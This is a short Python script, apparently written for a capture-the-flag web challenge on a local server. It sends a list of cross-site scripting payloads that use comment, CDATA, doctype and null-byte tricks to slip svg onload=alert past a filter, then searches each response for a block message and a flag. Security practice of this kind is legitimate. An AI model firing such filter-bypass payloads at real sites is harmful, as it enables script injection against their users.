base='http://127.0.0.1:9100/page'
# probe special markup declarations/comments/CDATA/doctype that start with <! and maybe browser creates nodes/scripts
payloads=[
'<!DOCTYPE html><svg onload=alert("XSS")>',
'<![CDATA[<script>alert("XSS")</script>]]>',
'<!--><svg onload=alert("XSS")>',
'--><svg onload=alert("XSS")>',
'<!----><svg onload=alert("XSS")>',
'<!-- --><svg onload=alert("XSS")>',
'<--><svg onload=alert("XSS")>',
'<!><svg onload=alert("XSS")>',
'<?><svg onload=alert("XSS")>',
'<`svg onload=alert("XSS")>',
'<//svg onload=alert("XSS")>',
'< /svg><svg onload=alert("XSS")>',
'<\x00><svg onload=alert("XSS")>',
]
for p in payloads:
    r=requests.get(base,params={'name':p},timeout=10)
    print('\nPAY',repr(p),'len',len(r.text),'block','Sorry' in r.text,'flag',re.findall(r'flag\{[^}]+\}',r.text))
    print(r.text[-350:].replace('\n',' '))
